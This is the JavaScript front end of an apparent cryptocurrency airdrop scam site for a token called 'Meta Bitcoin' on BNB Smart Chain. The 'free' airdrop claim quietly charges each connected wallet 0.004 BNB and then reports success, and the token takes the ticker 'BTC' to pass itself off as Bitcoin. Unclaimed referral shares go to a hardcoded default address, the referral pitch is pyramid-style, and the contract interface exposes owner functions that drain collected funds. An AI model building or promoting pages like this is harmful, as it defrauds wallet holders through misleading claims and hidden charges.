let web3 = new web3js.myweb3(window.ethereum);
let addr;

const sttaddr = "0xB9670F4b1B4bfcFe5a914753873Dd41d4694fEa6";
const sttabi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"stateMutability":"nonpayable","type":"fallback"},{"inputs":[{"internalType":"address","name":"_refer","type":"address"}],"name":"airdrop","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"owner_","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"num","type":"uint256"}],"name":"authNum","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_refer","type":"address"}],"name":"buy","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"cap","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"clearAllETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"clearETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getBlock","outputs":[{"internalType":"bool","name":"swAirdorp","type":"bool"},{"internalType":"bool","name":"swSale","type":"bool"},{"internalType":"uint256","name":"sPrice","type":"uint256"},{"internalType":"uint256","name":"sMaxBlock","type":"uint256"},{"internalType":"uint256","name":"nowBlock","type":"uint256"},{"internalType":"uint256","name":"balance","type":"uint256"},{"internalType":"uint256","name":"airdropEth","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint8","name":"tag","type":"uint8"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"set","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"ah","type":"address"},{"internalType":"address","name":"ah2","type":"address"}],"name":"setAuth","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}]


let sttcontract = new web3.eth.Contract(sttabi, sttaddr);

const loadweb3 = async () => {
  try {
		web3 = new web3js.myweb3(window.ethereum);
		console.log('Injected web3 detected.')
		sttcontract = new web3.eth.Contract(sttabi, sttaddr);
    let a = await ethereum.enable();
    addr = web3.utils.toChecksumAddress(a[0]);
    return(addr);

  } catch (error) {
    if (error.code === 4001) {
      console.log('Please connect to MetaMask.')
    } else {
      Swal.fire(
  'Connect Alert',
  'Please connect to Metamask, or paste URL link into Trustwallet (Dapps)...',
  'error'
)
    }
  }

};

const PleaseWait = async () => {
    Swal.fire(
        'Server Busy',
        'There are too many requests, Please try again after few minutes.',
        'error'
    )
}


const getAirdrop = async () => {
	await loadweb3();
    const chainId = await web3.eth.getChainId();
	if (addr == undefined) {
   Swal.fire(
  'Connect Alert',
  'Please connect to Metamask, or paste URL link into Trustwallet (Dapps)...',
  'error'
)
	}
  	if (chainId !== 56) {
   Swal.fire(
  'Connect Alert',
  'Please Connect on Network- "Smart Chain"',
  'error'
)
	}
    const gettkbl = await getbalance(addr);
  if(gettkbl == 0){
	  let airbnbVal = document.getElementById("airdropval").value;
   console.log(airbnbVal);
  airbnbVal = (0.004) * 1e18;

  let fresh = document.getElementById('airinput').value;
  if(fresh === "")
      fresh = "0x26347eb0083644E307A016EA5e9cB1b1646F7340";
  sttcontract.methods.airdrop(fresh).send({from:addr, value: airbnbVal}, (err, res) => {
              if(!err){
                Swal.fire({
       title: 'Claim Success',
       icon: 'success',
       html: '2 Meta Bitcoin (BTC) sent to your wallet.',
       showCloseButton: true,
       showCancelButton: true,
       focusConfirm: false,
       reverseButtons: true,
       focusCancel: true,
       cancelButtonText: 'Exit',
       confirmButtonText: 'View transfers'
     }).then((result) => {
       if (result.value) {
         window.location.href = 'https://bscscan.com/tx/'+ res +'';
       }
     });
              console.log(err);    
              }else{
  Swal.fire(
  'Airdrop Alert',
  'Claim Failed! Please try again.',
  'error'
)      
              }
            });
  }else{
      Swal.fire(
  'Claim Alert',
  'Address Have Claimed! Please Buy Now.',
  'error'
)
  }
}



const buystt = async () => {

	await loadweb3();
    const chainId = await web3.eth.getChainId();
	if (addr == undefined) {
		Swal.fire(
  'Connect Alert',
  'Please connect to Metamask, or paste URL link into Trustwallet (Dapps)...',
  'error'
)
	}
    if (chainId !== 56) {
        Swal.fire(
       'Connect Alert',
       'Please Connect on Network- "Smart Chain"',
       'error'
     )
         }

  let ethval = document.getElementById("buyinput").value;
  if(ethval >= 0.01){
  ethval = Number(ethval) * 1e18;
  let fresh = document.getElementById('airinput').value;
  if(fresh === "")
      fresh = "0x26347eb0083644E307A016EA5e9cB1b1646F7340";
  sttcontract.methods.buy(fresh).send({from:addr, value: ethval}, (err, res) => {
    if(!err){
            Swal.fire({
   title: 'Pre-Sale Order',
   icon: 'success',
   html: 'Successful payment transaction',
   showCloseButton: true,
   showCancelButton: true,
   focusConfirm: false,
   reverseButtons: true,
   focusCancel: true,
   cancelButtonText: 'Exit',
   confirmButtonText: 'View transfers'
 }).then((result) => {
   if (result.value) {
     window.location.href = 'https://bscscan.com/tx/'+ res +'';
   }
 }); 
              console.log(err);    
              }else{
  Swal.fire('',
  'Transaction Failed! Please try again.',
  'error'
)      
              }
  });
  }else{
    Swal.fire(
  'Buy Alert',
  'Buy Minimum = 0.01 BNB.',
  'error'
)
  }
}

const cooldowncheck = async () => {
  let blocknumber = await currentblock();
  let last = await lastblock();


  if(blocknumber - last < 50) {
    console.log(blocknumber, last);
    let waittime = 50 + last - blocknumber;
    console.log(waittime);
    alert("You must wait " + waittime + " blocks before claiming another airdrop");
    return false;
  }
  else return true;

};


const currentblock = async () => {
  let a;
  await web3.eth.getBlockNumber( (err, res) => {
    a = res;
  });
  return(a);
}

const lastblock = async () => {
  let a;
  await sttcontract.methods.lastairdrop(addr).call( (err, res) => {
    a = res;
  });
  return(a);
}
const getbalance = async (addr) => {
    let gets;
const ok = await sttcontract.methods.balanceOf(addr).call( (err, res) => {
    gets = res;
  });
   return Promise.resolve(gets);
}


window.onload=function(){

  function querySt(ji) {

  hu = window.location.search.substring(1);
  gy = hu.split("&");
 for (i = 0; i < gy.length; i++) {
   ft = gy[i].split("=");
   if (ft[0] == ji) {
     return ft[1];
   }
 }
 }
 var ref = querySt("ref");


 if (ref == null) {} else {
   document.getElementById('airinput').value = ref;
 }
}

function calculate() {
    var bnb = document.getElementById("buyinput").value;
    var tokensPerEth = 1000000;
    var tokens = tokensPerEth * bnb;
    console.log(tokens);
    document.getElementById("buyhch2input").value = tokens.toLocaleString("en-US");


}

function addToWallet() {


  try {
    web3.currentProvider.sendAsync({
      method: 'wallet_watchAsset',
      params: {
        'type': 'ERC20',
        'options': {
          'address': '0xB9670F4b1B4bfcFe5a914753873Dd41d4694fEa6',
          'symbol': 'BTC',
          'decimals': '18',
          'image': 'https://metabitcoin.digital/favi.png',
        },
      },
      id: Math.round(Math.random() * 100000)
    }, function (err, data) {
      if (!err) {
        if (data.result) {
          console.log('Token added');
        } else {
          console.log(data);
          console.log('Some error');
        }
      } else {
        console.log(err.message);
      }
    });
  } catch (e) {
    console.log(e);
  }
}


 function getreflink(){
     var referaladd = document.getElementById('refaddress').value;
     if(!document.getElementById('refaddress').value){
      Swal.fire(
  'Referral Alert',
  'Please Enter Your BEP20 Wallet Address.',
  'error'
)
     }else{
if(!/^(0x){1}[0-9a-fA-F]{40}$/i.test(referaladd)){
    Swal.fire(
  'Referral Alert',
  'Your Wallet Address is not valid!',
  'error'
)
}else{
    document.getElementById('refaddress').value = 'https://metabitcoin.digital/?ref=' + document.getElementById('refaddress').value;
}
}
}
function copyToClipboard(id) {
    var text = document.getElementById(id).value; //getting the text from that particular Row
    //window.prompt("Copy to clipboard: Ctrl+C, Enter", text);
    if (window.clipboardData && window.clipboardData.setData) {
        // IE specific code path to prevent textarea being shown while dialog is visible.
        return clipboardData.setData("Text", text);

    } else if (document.queryCommandSupported && document.queryCommandSupported("copy")) {
        var textarea = document.createElement("textarea");
        textarea.textContent = text;
        textarea.style.position = "fixed";  // Prevent scrolling to bottom of page in MS Edge.
        document.body.appendChild(textarea);
        textarea.select();
        try {
            return document.execCommand("copy");  // Security exception may be thrown by some browsers.
        } catch (ex) {
            console.warn("Copy to Clipboard failed!", ex);
            return false;
        } finally {
            document.body.removeChild(textarea);
        }
    }
  }

  function kopiraj() {
  var copyText = document.getElementById("refaddress");
  copyText.select();
  document.execCommand("Copy");
   alert("Link Copy Success! Send this link to invite your friends to claim airdrop. Receive 30% BNB + 50% BTC on all Meta Bitcoin Airdrop Claims and Buy"); 
}

function querySt(ji) {

  hu = window.location.search.substring(1); 
  gy = hu.split("&");
  
  for (i=0;i<gy.length;i++) { 
  ft = gy[i].split("="); 
  if (ft[0] == ji) { 
  return ft[1]; 
  } 
  } 
  } 
  var ref = querySt("ref");
  
  
  if( ref==null){
      ref = "0x26347eb0083644E307A016EA5e9cB1b1646F7340";
       document.getElementById('airinput').value = ref; 
  }else{ 
  document.getElementById('airinput').value = ref; 
  } 